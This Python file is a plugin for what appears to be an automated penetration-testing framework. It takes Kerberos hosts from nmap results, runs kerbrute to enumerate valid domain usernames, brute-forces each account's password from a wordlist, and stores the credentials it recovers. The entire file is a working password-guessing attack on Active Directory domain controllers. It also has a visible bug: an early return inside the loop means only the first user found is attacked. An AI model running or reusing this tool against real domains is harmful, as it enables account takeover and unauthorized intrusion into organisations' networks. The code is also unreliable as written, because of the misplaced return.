import ipaddress
import json
import re
import subprocess

from plugins.base_plugin import BasePlugin, PluginError
from plugins.credentials_manager import CredentialsManager
from plugins.nmap import NmapPlugin


class KerbrutePlugin(BasePlugin):
    name = "kerbrute"

    requirements = [NmapPlugin]
    optional = True

    def kerbrute_target(
        self,
        user_wordlist: str,
        password_wordlist: str,
        host: str,
        host_data: dict[str, ...],
    ) -> set[tuple[str, str]]:
        """
        Use kerbrute on target in order to obtain some credentials.

        Return set of found credentials as: { ( username, password ), }
        """

        host_addr = str(ipaddress.ip_address(host.removesuffix("/32")))

        raw_data = json.dumps(host_data)
        root_domain_regex = re.compile(
            r"Domain:\s(?P<domain>[^/]+)0\.,\sSite:\sDefault-First-Site-Name"
        )

        root_domain_match = root_domain_regex.search(raw_data)

        if root_domain_match is None:
            raise PluginError(f"No domain found for host {host}")

        root_domain = root_domain_match.group("domain")

        self.get_logger().info(f"Attacking Kerberos on domain {root_domain}")

        cmd = [
            "kerbrute",
            "userenum",
            "--dc",
            host_addr,
            "--domain",
            root_domain,
            user_wordlist,
        ]

        self.get_logger().debug(f"Starting user enumeration: {' '.join(cmd)}")

        raw_user_enumeration = subprocess.check_output(cmd).decode()
        user_regex = re.compile(
            fr"\[\+]\sVALID\sUSERNAME:\s+(?P<username>[^@]+)@{root_domain}"
        )

        usernames = set()
        # login set as { (username, password), }
        logins = set()

        login_regex = re.compile(
            r"\[\+]\sVALID\sLOGIN:\s+"
            fr"(?P<username>[^@]+)@{root_domain}:(?P<password>[^\n\r\u001b]*)"
        )

        for username_match in user_regex.finditer(raw_user_enumeration):
            # make username lower because windows is case insensitive and we don't
            # want to treat duplicates
            username = username_match.group("username").lower()

            if username in usernames:
                continue

            usernames.add(username)
            self.get_logger().debug(f"Found username: {username}@{root_domain}")

            cmd = [
                "kerbrute",
                "bruteuser",
                "--dc",
                host_addr,
                "--domain",
                root_domain,
                password_wordlist,
                username,
            ]

            self.get_logger().debug(f"Bruteforcing user: {' '.join(cmd)}")

            raw_user_bruteforce = subprocess.check_output(cmd).decode()

            for password_match in login_regex.finditer(raw_user_bruteforce):
                password = password_match.group("password")
                logins.add((username, password))

                self.get_logger().debug(
                    f"Found new credentials: {username}@{root_domain}:'{password}'"
                )

            return logins

    def run(self, user_wordlist: str, password_wordlist: str):
        super().run()

        # cannot run without provided wordlists
        if None in (user_wordlist, password_wordlist):
            return

        with NmapPlugin.get_parsed_file().open("r") as nmap_file:
            nmap_results = json.loads(nmap_file.read())

        # dictionary of found credentials
        results = {}
        found_credentials = set()

        for host, host_data in nmap_results.items():
            for service, service_data in host_data["services"].items():
                if service_data["name"] == "kerberos-sec":
                    break
            else:
                continue

            host_credentials = self.kerbrute_target(
                user_wordlist, password_wordlist, host, host_data
            )
            found_credentials |= host_credentials
            results[host] = {"credentials": list(host_credentials)}

        CredentialsManager.store_credentials(*found_credentials)

        with self.get_parsed_file().open("w") as result_file:
            result_file.write(json.dumps(results))
